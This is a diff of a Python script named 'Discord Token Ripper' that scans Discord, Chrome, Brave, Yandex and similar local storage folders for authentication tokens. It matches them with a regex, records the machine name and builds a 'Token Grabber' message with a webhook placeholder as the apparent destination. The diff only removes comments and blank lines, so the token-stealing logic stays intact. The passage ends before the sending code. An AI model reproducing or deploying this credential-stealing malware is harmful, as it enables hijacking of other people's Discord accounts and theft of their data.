@@ -1,30 +1,23 @@
-#   Discord Token Ripper    #
 import os, re, json, requests, random, string, datetime
-
-#   Settings    #
 WebHook = "%webhook%"
 avatar_url = "https://i.imgur.com/SkVHyor.jpg"
 bot_name = "The Ripper"
-
-#   Functions   #
 def getIPAddress():
     return "127.0.0.1"
-
 def token_ripper(path):
     tokens = []
     path += "\\Local Storage\\leveldb\\"
-
     try:
-        for file in os.listdir(path):                                                       # For every file in path
+        for file in os.listdir(path):
             if file.endswith('.ldb') or file.endswith('.log'):
-                with open(path + file, 'r', encoding='cp437') as f:                         # Opening files and reading them (Files that contains Discord token)
+                with open(path + file, 'r', encoding='cp437') as f:                         
                     content = f.read()
-                    token_finder = re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", content)   # Searching with regex for tokens
-                    for token in token_finder:                                              # For every token that it finds it appends tokens list
-                        tokens.append(token)                                                # Appending the list with the tokens it finds
-            else:                                                                           # If file not ends with .ldb or .log it skips it
+                    token_finder = re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", content)
+                    for token in token_finder:                                              
+                        tokens.append(token)                                                
+            else:                                                                    
                 continue
-    except:                                                                                 # If path not valid skipping this request
+    except:                                                                      
         pass
     return tokens
 
@@ -32,7 +25,6 @@ def ripper():
     machineName = os.environ['COMPUTERNAME']
     local = os.getenv('LOCALAPPDATA')
     roaming = os.getenv('APPDATA')
-
     paths = {
             'Discord': roaming + '\\Discord',
             'Discord Canary': roaming + '\\discordcanary',
@@ -42,13 +34,10 @@ def ripper():
             'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
             'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
         }
-    
     message = '```yaml\n' + 'Token Grabber | Fran2019\n'                                   # Title of the message
-
     for path in paths:
         if not os.path.exists(path):
             pass
-        
         message += f'\n{path}:\n'                                                           # Adding the title of the platform to the message
 
         tokens = token_ripper(paths[path])
